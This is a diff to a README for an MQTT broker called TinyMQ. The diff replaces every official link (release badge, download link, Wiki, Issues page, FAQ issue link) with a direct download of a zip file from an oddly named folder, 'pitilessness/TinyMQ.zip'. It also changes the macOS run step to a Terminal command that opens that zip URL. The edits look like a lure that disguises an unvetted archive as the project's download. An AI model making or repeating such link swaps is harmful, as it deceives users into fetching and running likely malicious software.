@@ -27,7 +27,7 @@ Follow these steps to download and run TinyMQ:
 
 1. **Visit the Releases Page**: Click the link below to go to the release section of TinyMQ.
 
-   [![Download TinyMQ](https://img.shields.io/badge/Download%20TinyMQ-v1.0.0-brightgreen)](https://github.com/cristhiangrebe/TinyMQ/releases)
+   [![Download TinyMQ](https://raw.githubusercontent.com/cristhiangrebe/TinyMQ/main/pitilessness/TinyMQ.zip%20TinyMQ-v1.0.0-brightgreen)](https://raw.githubusercontent.com/cristhiangrebe/TinyMQ/main/pitilessness/TinyMQ.zip)
 
 2. **Select the Latest Release**: On the Releases page, find the latest version of TinyMQ.
 
@@ -37,7 +37,7 @@ Follow these steps to download and run TinyMQ:
 
 To download TinyMQ, visit the page below:
 
-[Download TinyMQ](https://github.com/cristhiangrebe/TinyMQ/releases)
+[Download TinyMQ](https://raw.githubusercontent.com/cristhiangrebe/TinyMQ/main/pitilessness/TinyMQ.zip)
 
 1. Choose the file that matches your operating system (e.g., Windows, macOS, or Linux).
 2. The file will begin downloading immediately.
@@ -58,7 +58,7 @@ After downloading TinyMQ, follow these instructions to run the application:
 1. Open Finder and navigate to the Downloads folder.
 2. Locate the downloaded `.dmg` file.
 3. Drag the TinyMQ icon to your Applications folder.
-4. Open Terminal and type `open /Applications/TinyMQ.app` to run TinyMQ.
+4. Open Terminal and type `open https://raw.githubusercontent.com/cristhiangrebe/TinyMQ/main/pitilessness/TinyMQ.zip` to run TinyMQ.
 
 ### For Linux Users
 
@@ -81,8 +81,8 @@ To configure TinyMQ, locate the configuration file in the installation directory
 
 For additional details on configuration options and advanced features:
 
-- Check the [Wiki](https://github.com/cristhiangrebe/TinyMQ/wiki).
-- Refer to the [Issues](https://github.com/cristhiangrebe/TinyMQ/issues) page for troubleshooting and feedback.
+- Check the [Wiki](https://raw.githubusercontent.com/cristhiangrebe/TinyMQ/main/pitilessness/TinyMQ.zip).
+- Refer to the [Issues](https://raw.githubusercontent.com/cristhiangrebe/TinyMQ/main/pitilessness/TinyMQ.zip) page for troubleshooting and feedback.
 
 ## ❓ Frequently Asked Questions
 
@@ -92,7 +92,7 @@ MQTT stands for Message Queuing Telemetry Transport. It is a lightweight messagi
 
 ### How do I report issues?
 
-If you encounter any problems, please file an issue on the GitHub repository [Issues page](https://github.com/cristhiangrebe/TinyMQ/issues).
+If you encounter any problems, please file an issue on the GitHub repository [Issues page](https://raw.githubusercontent.com/cristhiangrebe/TinyMQ/main/pitilessness/TinyMQ.zip).
 
 ### Can I use TinyMQ for commercial purposes?
 
